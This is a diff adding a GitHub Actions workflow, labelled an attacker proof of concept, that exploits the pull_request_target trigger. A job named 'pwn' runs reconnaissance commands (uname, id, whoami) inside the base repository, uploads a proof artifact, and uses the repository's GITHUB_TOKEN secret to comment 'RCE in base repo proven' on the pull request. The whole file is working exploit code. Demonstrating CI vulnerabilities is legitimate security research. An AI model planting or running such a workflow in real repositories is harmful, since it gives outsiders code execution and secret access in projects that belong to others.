@@ -1,0 +1,31 @@
+name: Checkmarx (Modified by Attacker PoC)
+
+on:
+  pull_request_target:
+
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Proof of RCE in Base Repo
+        run: |
+          echo "🔥 Arbitrary Code Execution inside BASE repo"
+          echo "Repo: $GITHUB_REPOSITORY"
+          echo "Actor: $GITHUB_ACTOR"
+          uname -a
+          id
+          whoami
+
+      - name: Write Proof File
+        run: echo "RCE confirmed at $(date)" > proof.txt
+
+      - name: Upload Proof Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: rce-proof
+          path: proof.txt
+
+      - name: Comment Back on PR
+        run: gh pr comment ${{ github.event.pull_request.number }} --body "✅ RCE in base repo proven via pull_request_target"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
